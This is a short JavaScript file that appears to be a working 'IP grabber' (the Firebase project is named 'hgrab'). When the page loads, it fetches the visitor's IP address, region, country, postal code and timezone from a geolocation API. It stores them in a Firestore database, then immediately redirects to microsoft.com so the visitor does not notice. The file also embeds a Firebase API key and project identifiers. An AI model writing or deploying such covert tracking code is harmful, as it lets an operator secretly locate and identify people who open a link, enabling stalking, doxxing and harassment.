let firebaseConfig = {
    apiKey: "AIzaSyB_9QRMSPkJJkDntzSG3RF0aoPeAGnfUoY",
    authDomain: "hgrab-1d498.firebaseapp.com",
    projectId: "hgrab-1d498",
    storageBucket: "hgrab-1d498.firebasestorage.app",
    messagingSenderId: "295813545339",
    appId: "1:295813545339:web:803d209f2daee57273d1de",
    measurementId: "G-NBBMD6M21C"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

redirectLocation = "https://microsoft.com"



function putIP(ipStr, regionStr, countryStr, postalStr, timezoneStr) {
    console.log("putIP called with:", ipStr, regionStr, countryStr, postalStr, timezoneStr);
    if (!ipStr) {
        console.error("Invalid IP:", ipStr);
        return;
    }

    db.collection("ips").add({
        ip: ipStr,
        region: regionStr,
        country: countryStr,
        zip_code: postalStr,
        time_zone: timezoneStr,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(() => {
        window.location.replace(redirectLocation);
        console.log("putIP function successful... check firebase");
    })
    .catch(err => console.error("Error saving IP:", err));
}

fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        console.log("Fetched data:", data);
        putIP(data.ip, data.region, data.country_name, data.postal, data.timezone);
    })
    .catch(err => console.error("Error fetching IP:", err));
